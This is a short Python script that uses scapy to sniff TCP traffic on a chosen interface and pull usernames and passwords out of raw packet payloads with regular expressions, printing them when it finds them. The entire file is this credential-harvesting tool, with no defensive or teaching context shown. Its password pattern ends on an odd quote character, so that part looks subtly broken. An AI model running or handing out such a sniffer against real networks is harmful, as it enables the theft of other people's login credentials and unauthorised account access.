from scapy.all import *
import optparse
import re	
def main():
	parser = optparse.OptionParser('usage %prog '+'-i <interface>')
	parser.add_option('-i', dest='interface',type='string',help='specify interface to listen on')
	(options, args) = parser.parse_args()
	if options.interface == None:
		print(parser.usage)
		exit(0)
	else:
		conf.iface = options.interface
	try:
		print ('[*] Starting Sniffer.')
		sniff(filter='tcp', prn=findCredentials, store=0)
	except KeyboardInterrupt:
		exit(0)

def findCredentials(pkt):
	if pkt.haslayer(TCP):
		raw = pkt.sprintf("%Raw.load%")
		username=re.findall("(?i)username=(.*)&",raw)
		password=re.findall("(?i)password=(.*)'",raw)
		if username:
			print("Found username and password:",str(username),str(password))
if __name__ == '__main__':
	main()